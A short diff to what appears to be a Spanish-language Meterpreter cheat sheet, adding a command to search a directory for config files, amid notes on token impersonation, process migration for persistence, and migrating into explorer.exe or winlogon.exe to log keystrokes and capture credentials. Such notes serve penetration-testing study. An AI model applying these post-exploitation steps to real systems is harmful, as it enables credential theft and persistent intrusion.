@@ -29,6 +29,7 @@ use incognito
 Después list_tokens -u
 impersonate_token NOMBRE_TOKEN (Añadiendo doble barra cuando haya una barra \ -> \\
 getpid
+search -d /directorio -f *config*
 Si estamos utilizando meterpreter en un servicio que el usuario puede cerrar, cambiar a otro proceso con migrate PID
 run post/windows/manage/migrate => Migrar de proceso para seguir en el sistema
 Para capturar lo que escriba el usuario mejor estar en explorer.exe, y si queremos capturar las credenciales sin crackearlas, winlogon.exe. Cerrar con Ctrl+C
